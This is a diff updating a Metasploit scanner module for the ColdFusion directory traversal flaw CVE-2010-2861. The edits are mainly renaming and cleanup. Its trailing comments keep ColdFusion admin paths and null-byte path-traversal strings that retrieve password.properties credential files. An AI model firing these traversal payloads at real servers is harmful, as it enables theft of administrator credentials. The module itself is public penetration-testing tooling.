@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -39,7 +36,6 @@ class Metasploit3 < Msf::Auxiliary
           [ 'CVE', '2010-2861' ],
           [ 'BID', '42342' ],
           [ 'OSVDB', '67047' ],
-          [ 'URL', 'http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07' ],
           [ 'URL', 'http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861' ],
           [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-18.html' ],
         ]
@@ -49,7 +45,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptString.new('FILE', [ false,  'File to retrieve', '']),
         OptBool.new('FINGERPRINT', [true, 'Only fingerprint endpoints', false])
-      ], self.class)
+      ])
   end
 
   def fingerprint(response)
@@ -195,10 +191,9 @@ class Metasploit3 < Msf::Auxiliary
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::ArgumentError
   rescue ::Timeout::Error, ::Errno::EPIPE
   end
-
 end
 
-#URL's that may work for you:
+# URLs that may work for you:
 #"/CFIDE/administrator/enter.cfm",
 #"/CFIDE/wizards/common/_logintowizard.cfm",
 #"/CFIDE/administrator/archives/index.cfm",
@@ -206,7 +201,7 @@ end
 #"/CFIDE/administrator/entman/index.cfm",
 #"/CFIDE/administrator/logging/settings.cfm",
 
-#Files to grab
+# Files to grab
 #../../../../../../../../../../ColdFusion8/lib/password.properties%00en
 #../../../../../../../../../../CFusionMX7/lib/password.properties%00en
 #../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en
